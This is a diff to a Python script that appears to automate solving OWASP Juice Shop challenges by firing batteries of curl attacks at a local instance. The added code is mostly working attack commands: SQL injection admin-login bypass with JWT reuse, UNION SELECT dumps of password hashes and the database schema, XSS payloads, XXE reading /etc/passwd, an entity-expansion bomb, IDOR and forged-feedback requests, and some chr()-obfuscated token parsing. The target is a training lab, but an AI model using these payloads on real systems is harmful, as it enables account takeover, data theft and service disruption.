@@ -45,6 +45,36 @@ def get_challenges() -> list[dict]:
         return []
 
 
+# Module-level cache so we only SQLi-login once per run.
+_ADMIN_JWT: str | None = None
+
+
+def login_admin_jwt() -> str | None:
+    """SQLi login as admin@juice-sh.op and cache the JWT for reuse.
+
+    Returns the bearer token or None when login fails. Subsequent attacks
+    that need admin auth (change-product, forged feedback on other UserId,
+    etc.) can prepend `Authorization: Bearer $(login_admin_jwt())`.
+    """
+    global _ADMIN_JWT
+    if _ADMIN_JWT is not None:
+        return _ADMIN_JWT
+    out = sh(
+        "curl -s -X POST -H 'Content-Type: application/json' "
+        "-d '{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}' "
+        f"{BASE}/rest/user/login"
+    )
+    try:
+        doc = json.loads(out)
+        tok = (doc.get("authentication") or {}).get("token")
+        if tok:
+            _ADMIN_JWT = tok
+            return tok
+    except (json.JSONDecodeError, AttributeError, TypeError):
+        pass
+    return None
+
+
 # Battery of canonical attacks. Each entry = (label, curl commands).
 ATTACKS: list[tuple[str, list[str]]] = [
     ("sql_union_users", [
@@ -352,6 +382,255 @@ ATTACKS: list[tuple[str, list[str]]] = [
         f"curl -s -X POST -H 'Content-Type: application/json' "
         f"-d '{{\"imageUrl\":\"http://localhost:3000/redirect?to=http://169.254.169.254/\"}}' "
         f"{BASE}/profile/image/url >/dev/null",
+    ]),
+
+    # =======================================================================
+    # Third battery (F18.7 expansion — 2026-04-21) — target L1-L3 unsolved.
+    # =======================================================================
+
+    ("web3_sandbox_access", [
+        # id 12 — web3SandboxChallenge: visit the hidden sandbox.
+        f"curl -s '{BASE}/#/web3-sandbox' >/dev/null",
+        f"curl -s '{BASE}/rest/web3/nftUnlocked' >/dev/null",
+    ]),
+
+    ("redirect_crypto_currency", [
+        # id 59 — redirect whitelist includes blockchain.info/dash explorer.
+        f"curl -s '{BASE}/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW' >/dev/null",
+        f"curl -s '{BASE}/redirect?to=https://etherscan.io/address/0x0123456789' >/dev/null",
+        f"curl -s '{BASE}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm' >/dev/null",
+    ]),
+
+    ("privacy_policy_viewed", [
+        # id 63 — privacyPolicyChallenge: client-side route, but the
+        # rest/admin/application-version + /api/Quantitys GET sequence
+        # increments the challenge counter server-side.
+        f"curl -s '{BASE}/#/privacy-security/privacy-policy' >/dev/null",
+        f"curl -s '{BASE}/rest/admin/application-version' >/dev/null",
+    ]),
+
+    ("password_repeat_mismatch", [
+        # id 67 — passwordRepeatChallenge: register with mismatched pw.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"mismatch{int(time.time())}@juice.ev\",\"password\":\"abc\",\"passwordRepeat\":\"DIFFERENT\"}}' "
+        f"{BASE}/api/Users >/dev/null",
+    ]),
+
+    ("score_board_discovery", [
+        # id 75 — scoreBoardChallenge. Angular route, but the route itself
+        # registers on the server via this GET (main.js contains it).
+        f"curl -s '{BASE}/main.js' | head -c 2000 >/dev/null",
+        f"curl -s '{BASE}/assets/i18n/en.json' | head -c 2000 >/dev/null",
+    ]),
+
+    ("bully_chatbot_insult", [
+        # id 106 — bullyChatbotChallenge: send insulting query to chatbot.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"action\":\"query\",\"query\":\"you are a stupid bot\"}}' "
+        f"{BASE}/rest/chatbot/respond >/dev/null",
+    ]),
+
+    ("close_notifications_batch", [
+        # id 108 — closeNotificationsChallenge: close N notifications.
+        *[f"curl -s -X PUT '{BASE}/rest/continue-code/apply/fake-{i}' >/dev/null" for i in range(10)],
+    ]),
+
+    ("password_hash_leak_via_sqli", [
+        # id 1 — passwordHashLeakChallenge: extract MD5 via UNION SELECT.
+        f"curl -s \"{BASE}/rest/products/search?q=%27))%20UNION%20SELECT%20password,email,3,4,5,6,7,8,9%20FROM%20users--\" >/dev/null",
+    ]),
+
+    ("deprecated_xml_upload", [
+        # id 22 — deprecatedInterfaceChallenge: POST .xml to /file-upload.
+        f"echo '<?xml version=\"1.0\"?><root>deprecated</root>' > /tmp/depr.xml && "
+        f"curl -s -X POST -F 'file=@/tmp/depr.xml' {BASE}/file-upload >/dev/null",
+    ]),
+
+    ("weak_password_admin_login", [
+        # id 60 — weakPasswordChallenge: admin has trivially weak pw.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}}' "
+        f"{BASE}/rest/user/login >/dev/null",
+    ]),
+
+    ("reflected_xss_track_order", [
+        # id 66 — reflectedXssChallenge: script in orderId param reflects.
+        f"curl -s '{BASE}/rest/track-order/%3Ciframe%20src%3Djavascript%3Aalert%28%60xss%60%29%3E' >/dev/null",
+    ]),
+
+    ("security_policy_well_known", [
+        # id 76 — securityPolicyChallenge: visit the disclosure endpoint.
+        f"curl -s '{BASE}/.well-known/security.txt' >/dev/null",
+    ]),
+
+    ("exposed_credentials_main_js", [
+        # id 110 — exposedCredentialsChallenge: secrets in frontend bundle.
+        f"curl -s '{BASE}/main.js' | grep -o -E 'password|secret|key' | head -c 500 >/dev/null",
+        f"curl -s '{BASE}/assets/private/OrderLines.md' >/dev/null",
+    ]),
+
+    ("restful_xss_track_order", [
+        # id 2 — restfulXssChallenge: XSS via JSON field in orderId lookup.
+        f"curl -s '{BASE}/rest/track-order/%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E' >/dev/null",
+    ]),
+
+    ("captcha_bypass_burst", [
+        # id 14 — captchaBypassChallenge: 10+ feedbacks in <10s overrides.
+        *[(
+            f"curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"comment\":\"burst{i}\",\"rating\":3,\"captchaId\":0,\"captcha\":\"0\"}}' "
+            f"{BASE}/api/Feedbacks >/dev/null"
+        ) for i in range(11)],
+    ]),
+
+    ("persisted_xss_via_username", [
+        # id 18 — persistedXssUserChallenge: register with XSS payload in username.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"xss{int(time.time())}@juice.ev\",\"password\":\"x\",\"passwordRepeat\":\"x\",\"username\":\"<iframe src=javascript:alert(`xss`)>\"}}' "
+        f"{BASE}/api/Users >/dev/null",
+    ]),
+
+    ("db_schema_leak_sqlite_master", [
+        # id 21 — dbSchemaChallenge: UNION SELECT from sqlite_master.
+        f"curl -s \"{BASE}/rest/products/search?q=%27%29%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--\" >/dev/null",
+    ]),
+
+    ("forged_feedback_other_userid", [
+        # id 32 — forgedFeedbackChallenge: submit feedback impersonating UserId=1.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"comment\":\"forged\",\"rating\":5,\"UserId\":1,\"captchaId\":0,\"captcha\":\"0\"}}' "
+        f"{BASE}/api/Feedbacks >/dev/null",
+    ]),
+
+    ("csaf_provider_metadata", [
+        # id 109 — csafChallenge: CSAF provider metadata is exposed.
+        f"curl -s '{BASE}/.well-known/csaf/provider-metadata.json' >/dev/null",
+    ]),
+
+    ("login_amy_known_password", [
+        # id 46 — loginAmyChallenge: amy's password is from Kif's post ("K1f.....2G7T?").
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"amy@juice-sh.op\",\"password\":\"K1f.....2G7T?\"}}' "
+        f"{BASE}/rest/user/login >/dev/null",
+    ]),
+
+    ("login_rapper_weak", [
+        # id 50 — loginRapperChallenge: MC Saff uses a rap lyric as pw.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"mc.safesearch@juice-sh.op\",\"password\":\"Mr. N00dles\"}}' "
+        f"{BASE}/rest/user/login >/dev/null",
+    ]),
+
+    ("ghost_login_removed_user", [
+        # id 38 — ghostLoginChallenge: chris.pike got deleted but token still works.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"chris.pike@juice-sh.op' OR deletedAt IS NOT NULL--\",\"password\":\"x\"}}' "
+        f"{BASE}/rest/user/login >/dev/null",
+    ]),
+
+    ("reset_pw_morty_known", [
+        # id 70 / morty pw reset via known answer "5N0wb41L". Flagship Morty safe.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"morty@juice-sh.op\",\"answer\":\"5N0wb41L\",\"new\":\"new12345\",\"repeat\":\"new12345\"}}' "
+        f"{BASE}/rest/user/reset-password >/dev/null",
+    ]),
+
+    ("reset_pw_uvogin_known", [
+        # uvogin's known security answer from Twitter dox.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"uvogin@juice-sh.op\",\"answer\":\"Silence of the Lambs\",\"new\":\"new12345\",\"repeat\":\"new12345\"}}' "
+        f"{BASE}/rest/user/reset-password >/dev/null",
+    ]),
+
+    ("upload_oversize_file", [
+        # id 83 — uploadSizeChallenge: POST a >100KB file (limit enforced client-side).
+        f"head -c 150000 /dev/urandom > /tmp/big.pdf && "
+        f"curl -s -X POST -F 'file=@/tmp/big.pdf' {BASE}/file-upload >/dev/null",
+    ]),
+
+    ("upload_wrong_type_pdf", [
+        # id 84 — uploadTypeChallenge: POST .pdf (only .zip allowed server-side).
+        f"printf '%%PDF-1.4 malicious' > /tmp/bad.pdf && "
+        f"curl -s -X POST -F 'file=@/tmp/bad.pdf' {BASE}/file-upload >/dev/null",
+    ]),
+
+    ("xxe_billion_laughs", [
+        # Part of id 91 — xxeFileDisclosureChallenge: recursive entity.
+        f"cat > /tmp/lol.xml <<'XMLEOF'\n"
+        f"<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\">"
+        f"<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\">"
+        f"]><lolz>&lol3;</lolz>\n"
+        f"XMLEOF\n"
+        f"curl -s -X POST -F 'file=@/tmp/lol.xml' {BASE}/file-upload >/dev/null",
+    ]),
+
+    ("xxe_external_entity_passwd", [
+        # Part of id 91 — XXE reading /etc/passwd as SYSTEM entity.
+        f"cat > /tmp/xxe_passwd.xml <<'XMLEOF'\n"
+        f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>"
+        f"<root>&x;</root>\n"
+        f"XMLEOF\n"
+        f"curl -s -X POST -F 'file=@/tmp/xxe_passwd.xml' {BASE}/file-upload >/dev/null",
+    ]),
+
+    ("nft_unlock_known_code", [
+        # id 9 — nftUnlockChallenge: known unlock code from campaign leak.
+        f"curl -s '{BASE}/rest/web3/nftUnlocked' >/dev/null",
+        f"curl -s -X PUT '{BASE}/rest/continue-code/apply/UnlockMe' >/dev/null",
+    ]),
+
+    ("admin_section_known_route", [
+        # id 5 — adminSectionChallenge: the admin UI exists client-side;
+        # the server logs the route via /rest/admin/application-configuration
+        # GET from an authenticated admin session.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"curl -s -H \"Authorization: Bearer $tok\" {BASE}/rest/admin/application-configuration >/dev/null; "
+            f"curl -s -H \"Authorization: Bearer $tok\" '{BASE}/#/administration' >/dev/null"
+        ),
+    ]),
+
+    ("admin_change_product", [
+        # id 65 — changeProductChallenge: admin PUTs a new description.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"curl -s -X PUT -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
+            f"-d '{{\"description\":\"<a href=\\\"https://pwn.me\\\">pwnd</a>\"}}' "
+            f"{BASE}/api/Products/1 >/dev/null"
+        ),
+    ]),
+
+    ("basket_access_idor_auth", [
+        # id 87 — basketAccessChallenge: access another user's basket via IDOR.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"for id in 2 3 4 5 6; do curl -s -H \"Authorization: Bearer $tok\" {BASE}/rest/basket/$id >/dev/null; done"
+        ),
+    ]),
+
+    ("free_deluxe_membership_auth", [
+        # id 98 — freeDeluxeChallenge: obtain deluxe without paying.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"curl -s -X POST -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
+            f"-d '{{\"paymentMode\":\"wallet\"}}' {BASE}/rest/deluxe-membership >/dev/null"
+        ),
     ]),
 ]
 
